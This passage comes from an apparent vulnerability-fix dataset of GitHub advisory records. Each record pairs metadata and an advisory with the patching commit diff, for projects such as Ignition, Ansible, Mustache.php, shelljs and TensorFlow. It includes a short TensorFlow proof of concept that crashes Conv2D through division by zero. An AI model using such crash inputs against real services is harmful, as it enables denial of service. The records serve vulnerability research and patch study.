'')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tiny-conf.js'])","num_files":1.0},{"index":464,"vuln_id":"GHSA-4qwp-7c67-jmcc","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/facade\/ignition\/commit\/11ffca14abd22db779d90b12e193f8000f6d184b'}","dataset":"osv","summary":"Unauthenticated remote code execution in Ignition Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.","published_date":"2021-03-29","chain_len":1,"project":"https:\/\/github.com\/facade\/ignition","commit_href":"https:\/\/github.com\/facade\/ignition\/commit\/11ffca14abd22db779d90b12e193f8000f6d184b","commit_sha":"11ffca14abd22db779d90b12e193f8000f6d184b","patch":"SINGLE","chain_ord":"['11ffca14abd22db779d90b12e193f8000f6d184b']","before_first_fix_commit":"{'9fc6c3d3de5271a1b94cff19dce2c9295abf0ffa'}","last_fix_commit":"11ffca14abd22db779d90b12e193f8000f6d184b","chain_ord_pos":1.0,"commit_datetime":"02\/18\/2021, 11:46:18","message":"Fix MakeViewVariableOptionalSolution to disallow stream wrappers and files that do not end in .blade.php\n\nThis is already fixed in 2.5.2, See https:\/\/github.com\/facade\/ignition\/pull\/334\n\nI could not update to 2.5.2 due to some dependent package required php 7.3, currently clients site is running in php 7.2\n\nOn branch 2.4.1-branch\nChanges to be committed:\n\tmodified:   src\/Solutions\/MakeViewVariableOptionalSolution.php","author":"Anas Mirza","comments":null,"stats":"{'additions': 18, 'deletions': 0, 'total': 18}","files":"{'src\/Solutions\/MakeViewVariableOptionalSolution.php': {'additions': 18, 'deletions': 0, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facade\/ignition\/raw\/11ffca14abd22db779d90b12e193f8000f6d184b\/src%2FSolutions%2FMakeViewVariableOptionalSolution.php', 'patch': '@@ -4,6 +4,7 @@\\n \\n use Facade\\\\IgnitionContracts\\\\RunnableSolution;\\n use Illuminate\\\\Support\\\\Facades\\\\Blade;\\n+use Illuminate\\\\Support\\\\Str;\\n \\n class MakeViewVariableOptionalSolution implements RunnableSolution\\n {\\n@@ -70,8 +71,25 @@ public function run(array $parameters = [])\\n         }\\n     }\\n \\n+    protected function isSafePath(string $path): bool\\n+    {\\n+        if (!Str::startsWith($path, [\\'\/\\', \\'.\/\\'])) {\\n+            return false;\\n+        }\\n+\\n+        if (!Str::endsWith($path, \\'.blade.php\\')) {\\n+            return false;\\n+        }\\n+\\n+        return true;\\n+    }\\n+\\n     public function makeOptional(array $parameters = [])\\n     {\\n+        if (!$this->isSafePath($parameters[\\'viewFile\\'])) {\\n+            return false;\\n+        }\\n+\\n         $originalContents = file_get_contents($parameters[\\'viewFile\\']);\\n         $newContents = str_replace(\\'$\\'.$parameters[\\'variableName\\'], \\'$\\'.$parameters[\\'variableName\\'].\" ?? \\'\\'\", $originalContents);'}}","message_norm":"fix makeviewvariableoptionalsolution to disallow stream wrappers and files that do not end in .blade.php\n\nthis is already fixed in 2.5.2, see https:\/\/github.com\/facade\/ignition\/pull\/334\n\ni could not update to 2.5.2 due to some dependent package required php 7.3, currently clients site is running in php 7.2\n\non branch 2.4.1-branch\nchanges to be committed:\n\tmodified:   src\/solutions\/makeviewvariableoptionalsolution.php","language":"en","entities":"[('fix', 'ACTION', ''), ('fixed', 'ACTION', ''), ('2.5.2', 'VERSION', ''), ('https:\/\/github.com\/facade\/ignition\/pull\/334', 'URL', ''), ('update', 'ACTION', ''), ('2.5.2', 'VERSION', ''), ('2.4.1', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Solutions\/MakeViewVariableOptionalSolution.php'])","num_files":1.0},{"index":466,"vuln_id":"GHSA-4r4m-hjwj-43p8","cwe_id":"{'CWE-300'}","score":0.0,"chain":"{'https:\/\/github.com\/socketio\/engine.io-client\/commit\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1'}","dataset":"osv","summary":"Insecure Defaults Allow MITM Over TLS in engine.io-client Affected versions of `engine.io-client` do not verify certificates by default, and as such may be vulnerable to Man-in-the-Middle attacks.\n\nThe vulnerability is related to the way that node.js handles the `rejectUnauthorized` setting. If the value is something that evaluates to false, such as undefined or null, certificate verification will be disabled. \n\n\n\n## Recommendation\n\nUpdate to version 1.6.9 or later.\n\nIf you are unable to upgrade, ensure all calls to socket.io to have a `rejectedUnauthorized: true` flag.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/socketio\/engine.io-client","commit_href":"https:\/\/github.com\/socketio\/engine.io-client\/commit\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1","commit_sha":"2c55b278a491bf45313ecc0825cf800e2f7ff5c1","patch":"SINGLE","chain_ord":"['2c55b278a491bf45313ecc0825cf800e2f7ff5c1']","before_first_fix_commit":"{'6045ccf5aa3ad5dbd976acb1e722a9692a5d55fb'}","last_fix_commit":"2c55b278a491bf45313ecc0825cf800e2f7ff5c1","chain_ord_pos":1.0,"commit_datetime":"03\/30\/2016, 15:30:14","message":"default `rejectUnauthorized` to `true`","author":"Guillermo Rauch","comments":"{'com_1': {'author': 'andrew-aladev', 'datetime': '09\/28\/2016, 13:48:33', 'body': 'WAT? I am sure that you haven\\'t tested websocket with this \"patch\".'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/socket.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/socketio\/engine.io-client\/raw\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1\/lib%2Fsocket.js', 'patch': \"@@ -90,7 +90,7 @@ function Socket (uri, opts) {\\n   this.cert = opts.cert || null;\\n   this.ca = opts.ca || null;\\n   this.ciphers = opts.ciphers || null;\\n-  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? null : opts.rejectUnauthorized;\\n+  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? true : opts.rejectUnauthorized;\\n \\n   \/\/ other options for Node.js client\\n   var freeGlobal = typeof global === 'object' && global;\"}}","message_norm":"default `rejectunauthorized` to `true`","language":"ro","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/socket.js'])","num_files":1.0},{"index":468,"vuln_id":"GHSA-4r65-35qq-ch8j","cwe_id":"{'CWE-209'}","score":5.5,"chain":"{'https:\/\/github.com\/ansible\/ansible\/commit\/fe28767970c8ec62aabe493c46b53a5de1e5fac0'}","dataset":"osv","summary":"Ansible discloses sensitive information in traceback error message Ansible is an IT automation system that handles configuration management, application deployment, cloud provisioning, ad-hoc task execution, network automation, and multi-node orchestration. A flaw was found in Ansible Engine's ansible-connection module where sensitive information, such as the Ansible user credentials, is disclosed by default in the traceback error message when Ansible receives an unexpected response from `set_options`. The highest threat from this vulnerability is confidentiality.","published_date":"2022-03-04","chain_len":1,"project":"https:\/\/github.com\/ansible\/ansible","commit_href":"https:\/\/github.com\/ansible\/ansible\/commit\/fe28767970c8ec62aabe493c46b53a5de1e5fac0","commit_sha":"fe28767970c8ec62aabe493c46b53a5de1e5fac0","patch":"SINGLE","chain_ord":"['fe28767970c8ec62aabe493c46b53a5de1e5fac0']","before_first_fix_commit":"{'6d2398db280f145eed70a6618282c9db630a380a'}","last_fix_commit":"fe28767970c8ec62aabe493c46b53a5de1e5fac0","chain_ord_pos":1.0,"commit_datetime":"06\/07\/2021, 20:43:11","message":"Fixed exposed credentials in exception\n\nUnder certain conditions, sensitive connection parameters are shown in tracebacks when Ansible receives an unexpected response (in my case `None`) from `set_options` in ansible-connection. This patch creates a list of sensitive connection parameter names from `ansible.constants`, pulls a list of those values in the `params` that are about to be dumped to the screen and log file, and sends the `params` and list of `sensitive_values` to the `module_utils.common.parameters.remove_values` function for processing to hide them before being exposed.","author":"dalrrard","comments":null,"stats":"{'additions': 18, 'deletions': 1, 'total': 19}","files":"{'lib\/ansible\/module_utils\/connection.py': {'additions': 18, 'deletions': 1, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ansible\/ansible\/raw\/fe28767970c8ec62aabe493c46b53a5de1e5fac0\/lib%2Fansible%2Fmodule_utils%2Fconnection.py', 'patch': '@@ -38,10 +38,13 @@\\n import uuid\\n \\n from functools import partial\\n+from ansible import constants as C\\n from ansible.module_utils._text import to_bytes, to_text\\n from ansible.module_utils.common.json import AnsibleJSONEncoder\\n+from ansible.module_utils.common.parameters import remove_values\\n from ansible.module_utils.six import iteritems\\n from ansible.module_utils.six.moves import cPickle\\n+from ansible.utils.helpers import deduplicate_list\\n \\n \\n def write_to_file_descriptor(fd, obj):\\n@@ -163,12 +166,26 @@ def _exec_jsonrpc(self, name, *args, **kwargs):\\n         try:\\n             response = json.loads(out)\\n         except ValueError:\\n-            params = [repr(arg) for arg in args] + [\\'{0}={1!r}\\'.format(k, v) for k, v in iteritems(kwargs)]\\n+            sensitive_keys = list(\\n+                    C.MAGIC_VARIABLE_MAPPING[\"password\"]\\n+                    + C.MAGIC_VARIABLE_MAPPING[\"private_key_file\"]\\n+                    + C.MAGIC_VARIABLE_MAPPING[\"become_pass\"]\\n+            )\\n+            sensitive_values = [\\n+                v2 \\n+                for k, v in iteritems(kwargs) \\n+                for k2, v2 in iteritems(v) \\n+                if k2 in sensitive_keys\\n+            ]\\n+            params = [repr(remove_values(arg, sensitive_values)) for arg in args] + [\\n+                \"{0}={1!r}\".format(k, remove_values(v, sensitive_values)) \\n+                for k, v in iteritems(kwargs)]\\n             params = \\', \\'.join(params)\\n             raise ConnectionError(\\n                 \"Unable to decode JSON from response to {0}({1}). Received \\'{2}\\'.\".format(name, params, out)\\n             )\\n \\n+\\n         if response[\\'id\\'] != reqid:\\n             raise ConnectionError(\\'invalid json-rpc id received\\')\\n         if \"result_type\" in response:'}}","message_norm":"fixed exposed credentials in exception\n\nunder certain conditions, sensitive connection parameters are shown in tracebacks when ansible receives an unexpected response (in my case `none`) from `set_options` in ansible-connection. this patch creates a list of sensitive connection parameter names from `ansible.constants`, pulls a list of those values in the `params` that are about to be dumped to the screen and log file, and sends the `params` and list of `sensitive_values` to the `module_utils.common.parameters.remove_values` function for processing to hide them before being exposed.","language":"en","entities":"[('fixed', 'ACTION', ''), ('sensitive', 'SECWORD', ''), ('sensitive', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ansible\/module_utils\/connection.py'])","num_files":1.0},{"index":469,"vuln_id":"GHSA-4r8q-gv9j-3xx6","cwe_id":"{'CWE-601'}","score":4.3,"chain":"{'https:\/\/github.com\/tenancy\/multi-tenant\/commit\/9c837a21bccce9bcaeb90033ef200d84f0d9e164'}","dataset":"osv","summary":"Open Redirect ### Impact\nIn some situations, it is possible to have open redirects where users can be redirected from your site to any other site using a specially crafted URL.\nThis is only the case for installations where the default Hostname Identification is used and the environment uses tenants that have `force_https` set to `true` (default: `false`)\n\n### Patches\nVersion 5.7.2 contains the relevant patches to fix this bug. Stripping the URL from special characters to prevent specially crafted URL's from being redirected to.\n\n### Workarounds\nThere is a simple way to work around the security issue\n- Set the `force_https` to every tenant to `false`\n\n### References\nhttps:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-11784\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us in Discord: https:\/\/tenancy.dev\/chat","published_date":"2022-03-18","chain_len":1,"project":"https:\/\/github.com\/tenancy\/multi-tenant","commit_href":"https:\/\/github.com\/tenancy\/multi-tenant\/commit\/9c837a21bccce9bcaeb90033ef200d84f0d9e164","commit_sha":"9c837a21bccce9bcaeb90033ef200d84f0d9e164","patch":"SINGLE","chain_ord":"['9c837a21bccce9bcaeb90033ef200d84f0d9e164']","before_first_fix_commit":"{'41150dce84288f24ff68c8df433a45f966a60865'}","last_fix_commit":"9c837a21bccce9bcaeb90033ef200d84f0d9e164","chain_ord_pos":1.0,"commit_datetime":"05\/27\/2021, 04:40:08","message":"Trim slashes from request uri before redirecting (#1001)","author":"Jasper Zonneveld","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Middleware\/HostnameActions.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tenancy\/multi-tenant\/raw\/9c837a21bccce9bcaeb90033ef200d84f0d9e164\/src%2FMiddleware%2FHostnameActions.php', 'patch': \"@@ -95,7 +95,7 @@ protected function secure(Hostname $hostname, Request $request)\\n     {\\n         $this->emitEvent(new Secured($hostname));\\n \\n-        return $this->redirect->secure($request->getRequestUri());\\n+        return $this->redirect->secure(ltrim($request->getRequestUri(), '\/'));\\n     }\\n \\n     \/**\"}}","message_norm":"trim slashes from request uri before redirecting (#1001)","language":"en","entities":"[('#1001', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Middleware\/HostnameActions.php'])","num_files":1.0},{"index":478,"vuln_id":"GHSA-4rcq-jv2f-898j","cwe_id":"{'CWE-684'}","score":3.5,"chain":"{'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/d28ed758d077a5bf19ddac4da468f7224114df23', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/4020210b193f77cf1785b21717f6ef7c5de5f0f8', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/f5d801251aa5436aff44660c87d7013e29ac5864', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/6821c236f9ae23adf21d46ce0d56768ac8d0c467', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/a45ca9c788f648d10cccce2af41405bf25ee2948', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/021ab572a319ca3db5907a33a59774f502b3b975', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/9bd1cf585fccdfe8318fff7af793730e74a04db3', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/1b7946ed14b386a24db050f2d6dba81ba6518755', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/2281a205c3e70ec20f35ec8fafecee0d5c4f3478', 'https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/19f01bb42d02da539446a52a25bb0c1232b86327'}","dataset":"osv","summary":"Incorrect Provision of Specified Functionality in qutebrowser # Description\n\nAfter a certificate error was overridden by the user, qutebrowser displays the URL as yellow (`colors.statusbar.url.warn.fg`). However, when the affected website was subsequently loaded again, the URL was mistakenly displayed as green (`colors.statusbar.url.success_https`). While the user already has seen a certificate error prompt at this point (or set `content.ssl_strict` to `false` which is not recommended), this could still provide a false sense of security.\n\n# Affected versions and patches\n\nAll versions of qutebrowser are believed to be affected, though versions before v0.11.x couldn't be tested.\n\nThe issue is fixed in qutebrowser v1.11.1 (pending release) and v1.12.0 (unreleased). Backported patches for older versions are available, but no further releases are planned.\n\n# Mitigation\n\nIf you are unable to upgrade:\n\n- Treat any host with a certificate exception as insecure, ignoring the URL color\n- Or set `content.ssl_strict` to `True` (instead of `'ask'`), preventing certificate exceptions\n\n# References\n\n- qutebrowser issue: https:\/\/github.com\/qutebrowser\/qutebrowser\/issues\/5403\n- Fix (master branch): https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/021ab572a319ca3db5907a33a59774f502b3b975\n- Related issue for KDE Falkon: https:\/\/bugs.kde.org\/show_bug.cgi?id=420902\n- Related issue for eric6 Web Browser: https:\/\/tracker.die-offenbachs.homelinux.org\/eric\/issue328 (fixed in eric6 20.6)","published_date":"2020-05-08","chain_len":10,"project":"https:\/\/github.com\/qutebrowser\/qutebrowser","commit_href":"https:\/\/github.com\/qutebrowser\/qutebrowser\/commit\/1b7946ed14b386a24db050f2d6dba81ba6518755","commit_sha":"1b7946ed14b386a24db050f2d6dba81ba6518755","patch":"MULTI","chain_ord":"['d28ed758d077a5bf19ddac4da468f7224114df23', '9bd1cf585fccdfe8318fff7af793730e74a04db3', '6821c236f9ae23adf21d46ce0d56768ac8d0c467', '4020210b193f77cf1785b21717f6ef7c5de5f0f8', 'f5d801251aa5436aff44660c87d7013e29ac5864', 'a45ca9c788f648d10cccce2af41405bf25ee2948', '2281a205c3e70ec20f35ec8fafecee0d5c4f3478', '19f01bb42d02da539446a52a25bb0c1232b86327', '021ab572a319ca3db5907a33a59774f502b3b975', '1b7946ed14b386a24db050f2d6dba81ba6518755']","before_first_fix_commit":"{'e15af6cd92d523b22fe9774b653a859b9e33df41'}","last_fix_commit":"1b7946ed14b386a24db050f2d6dba81ba6518755","chain_ord_pos":10.0,"commit_datetime":"05\/02\/2020, 17:03:20","message":"Update changelog","author":"Florian Bruhin","comments":null,"stats":"{'additions': 10, 'deletions': 1, 'total': 11}","files":"{'doc\/changelog.asciidoc': {'additions': 10, 'deletions': 1, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/qutebrowser\/qutebrowser\/raw\/1b7946ed14b386a24db050f2d6dba81ba6518755\/doc%2Fchangelog.asciidoc', 'patch': '@@ -45,7 +45,16 @@ Fixed\\n v1.11.1 (unreleased)\\n --------------------\\n \\n-No changes yet.\\n+Security\\n+~~~~~~~~\\n+\\n+- After a certificate error was overridden by the user, qutebrowser displays\\n+  the URL as yellow (`colors.statusbar.url.warn.fg`). However, when the\\n+  affected website was subsequently loaded again, the URL was mistakenly\\n+  displayed as green (`colors.statusbar.url.success_https`). While the user\\n+  already has seen a certificate error prompt at this point (or set\\n+  `content.ssl_strict` to `false` which is not recommended), this could still\\n+  provide a false sense of security. This is now fixed.\\n \\n v1.11.0 (2020-04-27)\\n --------------------'}}","message_norm":"update changelog","language":"nl","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['doc\/changelog.asciidoc'])","num_files":1.0},{"index":486,"vuln_id":"GHSA-4rmr-c2jx-vx27","cwe_id":"{'CWE-1336'}","score":8.8,"chain":"{'https:\/\/github.com\/bobthecow\/mustache.php\/commit\/579ffa5c96e1d292c060b3dd62811ff01ad8c24e'}","dataset":"osv","summary":"Mustache remote code injection vulnerability In Mustache.php v2.0.0 through v2.14.0, Sections tag can lead to arbitrary php code execution even if strict_callables is true when section value is controllable.","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/bobthecow\/mustache.php","commit_href":"https:\/\/github.com\/bobthecow\/mustache.php\/commit\/579ffa5c96e1d292c060b3dd62811ff01ad8c24e","commit_sha":"579ffa5c96e1d292c060b3dd62811ff01ad8c24e","patch":"SINGLE","chain_ord":"['579ffa5c96e1d292c060b3dd62811ff01ad8c24e']","before_first_fix_commit":"{'076209772dda21cbfdbf5ef99d202a0937da4826'}","last_fix_commit":"579ffa5c96e1d292c060b3dd62811ff01ad8c24e","chain_ord_pos":1.0,"commit_datetime":"01\/21\/2022, 06:08:36","message":"Fix CVE-2022-0323 (improper neutralization of section names) \n\n- Fixes possible RCE when rendering untrusted user templates.\n- Remove unnecessary comments in generated source.","author":"Justin Hileman","comments":null,"stats":"{'additions': 2, 'deletions': 4, 'total': 6}","files":"{'src\/Mustache\/Compiler.php': {'additions': 2, 'deletions': 4, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bobthecow\/mustache.php\/raw\/579ffa5c96e1d292c060b3dd62811ff01ad8c24e\/src%2FMustache%2FCompiler.php', 'patch': \"@@ -320,7 +320,6 @@ private function block($nodes)\\n     }\\n \\n     const SECTION_CALL = '\\n-        \/\/ %s section\\n         $value = $context->%s(%s);%s\\n         $buffer .= $this->section%s($context, $indent, $value);\\n     ';\\n@@ -391,11 +390,10 @@ private function section($nodes, $id, $filters, $start, $end, $otag, $ctag, $lev\\n         $id      = var_export($id, true);\\n         $filters = $this->getFilters($filters, $level);\\n \\n-        return sprintf($this->prepare(self::SECTION_CALL, $level), $id, $method, $id, $filters, $key);\\n+        return sprintf($this->prepare(self::SECTION_CALL, $level), $method, $id, $filters, $key);\\n     }\\n \\n     const INVERTED_SECTION = '\\n-        \/\/ %s inverted section\\n         $value = $context->%s(%s);%s\\n         if (empty($value)) {\\n             %s\\n@@ -418,7 +416,7 @@ private function invertedSection($nodes, $id, $filters, $level)\\n         $id      = var_export($id, true);\\n         $filters = $this->getFilters($filters, $level);\\n \\n-        return sprintf($this->prepare(self::INVERTED_SECTION, $level), $id, $method, $id, $filters, $this->walk($nodes, $level));\\n+        return sprintf($this->prepare(self::INVERTED_SECTION, $level), $method, $id, $filters, $this->walk($nodes, $level));\\n     }\\n \\n     const PARTIAL_INDENT = ', $indent . %s';\"}}","message_norm":"fix cve-2022-0323 (improper neutralization of section names) \n\n- fixes possible rce when rendering untrusted user templates.\n- remove unnecessary comments in generated source.","language":"en","entities":"[('fix', 'ACTION', ''), ('cve-2022-0323', 'VULNID', 'CVE'), ('improper neutralization', 'SECWORD', ''), ('untrusted', 'SECWORD', ''), ('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Mustache\/Compiler.php'])","num_files":1.0},{"index":487,"vuln_id":"GHSA-4rq4-32rv-6wp6","cwe_id":"{'CWE-269'}","score":7.1,"chain":"{'https:\/\/github.com\/shelljs\/shelljs\/commit\/d919d22dd6de385edaa9d90313075a77f74b338c'}","dataset":"osv","summary":"Improper Privilege Management in shelljs shelljs is vulnerable to Improper Privilege Management","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/shelljs\/shelljs","commit_href":"https:\/\/github.com\/shelljs\/shelljs\/commit\/d919d22dd6de385edaa9d90313075a77f74b338c","commit_sha":"d919d22dd6de385edaa9d90313075a77f74b338c","patch":"SINGLE","chain_ord":"['d919d22dd6de385edaa9d90313075a77f74b338c']","before_first_fix_commit":"{'fcf1651be9a3bb8e20ba1fd24b8a91f369829c53'}","last_fix_commit":"d919d22dd6de385edaa9d90313075a77f74b338c","chain_ord_pos":1.0,"commit_datetime":"01\/07\/2022, 05:14:23","message":"fix(exec): lockdown file permissions (#1060)\n\nThis locks down file permissions used by the internal implementation of\r\n`shell.exec()`.\r\n\r\nIssue #1058\r\nTested manually using the documented scenarios","author":"Nate Fischer","comments":null,"stats":"{'additions': 19, 'deletions': 1, 'total': 20}","files":"{'src\/exec.js': {'additions': 19, 'deletions': 1, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/shelljs\/shelljs\/raw\/d919d22dd6de385edaa9d90313075a77f74b338c\/src%2Fexec.js', 'patch': \"@@ -48,7 +48,24 @@ function execSync(cmd, opts, pipe) {\\n     stderrFile: stderrFile,\\n   };\\n \\n-  fs.writeFileSync(paramsFile, JSON.stringify(paramsToSerialize), 'utf8');\\n+  \/\/ Create the files and ensure these are locked down (for read and write) to\\n+  \/\/ the current user. The main concerns here are:\\n+  \/\/\\n+  \/\/ * If we execute a command which prints sensitive output, then\\n+  \/\/   stdoutFile\/stderrFile must not be readable by other users.\\n+  \/\/ * paramsFile must not be readable by other users, or else they can read it\\n+  \/\/   to figure out the path for stdoutFile\/stderrFile and create these first\\n+  \/\/   (locked down to their own access), which will crash exec() when it tries\\n+  \/\/   to write to the files.\\n+  function writeFileLockedDown(filePath, data) {\\n+    fs.writeFileSync(filePath, data, {\\n+      encoding: 'utf8',\\n+      mode: parseInt('600', 8),\\n+    });\\n+  }\\n+  writeFileLockedDown(stdoutFile, '');\\n+  writeFileLockedDown(stderrFile, '');\\n+  writeFileLockedDown(paramsFile, JSON.stringify(paramsToSerialize));\\n \\n   var execArgs = [\\n     path.join(__dirname, 'exec-child.js'),\\n@@ -91,6 +108,7 @@ function execSync(cmd, opts, pipe) {\\n   }\\n \\n   \/\/ No biggie if we can't erase the files now -- they're in a temp dir anyway\\n+  \/\/ and we locked down permissions (see the note above).\\n   try { common.unlinkSync(paramsFile); } catch (e) {}\\n   try { common.unlinkSync(stderrFile); } catch (e) {}\\n   try { common.unlinkSync(stdoutFile); } catch (e) {}\"}}","message_norm":"fix(exec): lockdown file permissions (#1060)\n\nthis locks down file permissions used by the internal implementation of\r\n`shell.exec()`.\r\n\r\nissue #1058\r\ntested manually using the documented scenarios","language":"en","entities":"[('fix(exec', 'ACTION', ''), ('file permissions', 'SECWORD', ''), ('#1060', 'ISSUE', ''), ('file permissions', 'SECWORD', ''), ('#1058', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/exec.js'])","num_files":1.0},{"index":493,"vuln_id":"GHSA-4v5p-v5h9-6xjx","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0'}","dataset":"osv","summary":"`CHECK`-failures in Tensorflow ### Impact\nAn attacker can trigger denial of service via assertion failure by altering a `SavedModel` on disk such that `AttrDef`s of some operation are duplicated.\n\n### Patches\nWe have patched the issue in GitHub commit [c2b31ff2d3151acb230edc3f5b1832d2c713a9e0](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0","commit_sha":"c2b31ff2d3151acb230edc3f5b1832d2c713a9e0","patch":"SINGLE","chain_ord":"['c2b31ff2d3151acb230edc3f5b1832d2c713a9e0']","before_first_fix_commit":"{'41424fd983e23b11ed13bbd5a2b2be0e25ab4244'}","last_fix_commit":"c2b31ff2d3151acb230edc3f5b1832d2c713a9e0","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2021, 18:14:10","message":"Remove a `DCHECK`-fail, log an error instead.\n\n`DCHECK` in debug mode results in crashes. TensorFlow has had multiple vulnerabilities due to this.\n\nOutside of debug mode, `DCHECK` is a no-op.\n\nA better alternative is to report an error to the log buffer and continue. This should happen both in debug mode and in prod mode.\n\nPiperOrigin-RevId: 408375925\nChange-Id: Id5b3e19c73f3fbe0cc4bba26ca44ff9607bb6356","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'tensorflow\/core\/framework\/op_def_util.cc': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0\/tensorflow%2Fcore%2Fframework%2Fop_def_util.cc', 'patch': '@@ -821,9 +821,10 @@ bool RepeatedAttrDefEqual(\\n     const protobuf::RepeatedPtrField<OpDef::AttrDef>& a2) {\\n   std::unordered_map<string, const OpDef::AttrDef*> a1_set;\\n   for (const OpDef::AttrDef& def : a1) {\\n-    DCHECK(a1_set.find(def.name()) == a1_set.end())\\n-        << \"AttrDef names must be unique, but \\'\" << def.name()\\n-        << \"\\' appears more than once\";\\n+    if (a1_set.find(def.name()) != a1_set.end()) {\\n+      LOG(ERROR) << \"AttrDef names must be unique, but \\'\" << def.name()\\n+                 << \"\\' appears more than once\";\\n+    }\\n     a1_set[def.name()] = &def;\\n   }\\n   for (const OpDef::AttrDef& def : a2) {'}}","message_norm":"remove a `dcheck`-fail, log an error instead.\n\n`dcheck` in debug mode results in crashes. tensorflow has had multiple vulnerabilities due to this.\n\noutside of debug mode, `dcheck` is a no-op.\n\na better alternative is to report an error to the log buffer and continue. this should happen both in debug mode and in prod mode.\n\npiperorigin-revid: 408375925\nchange-id: id5b3e19c73f3fbe0cc4bba26ca44ff9607bb6356","language":"en","entities":"[('remove', 'ACTION', ''), ('error', 'FLAW', ''), ('vulnerabilities', 'SECWORD', ''), ('error', 'FLAW', ''), ('408375925', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/op_def_util.cc'])","num_files":1.0},{"index":495,"vuln_id":"GHSA-4vf2-4xcg-65cx","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b12aa1d44352de21d1a6faaf04172d8c2508b42b'}","dataset":"osv","summary":"Division by 0 in `Conv2D` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n                               \ntf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)\n```                            \n                               \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/988087bd83f144af14087fe4fecee2d250d93737\/tensorflow\/core\/kernels\/conv_ops.cc#L261-L263) does a division by a quantity that is controlled by the caller:\n```cc\n  const int64 patch_depth = filter.dim_size(2);\n  if (in_depth % patch_depth != 0) { ... }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b12aa1d44352de21d1a6faaf04172d8c2508b42b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b12aa1d44352de21d1a6faaf04172d8c2508b42b).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security 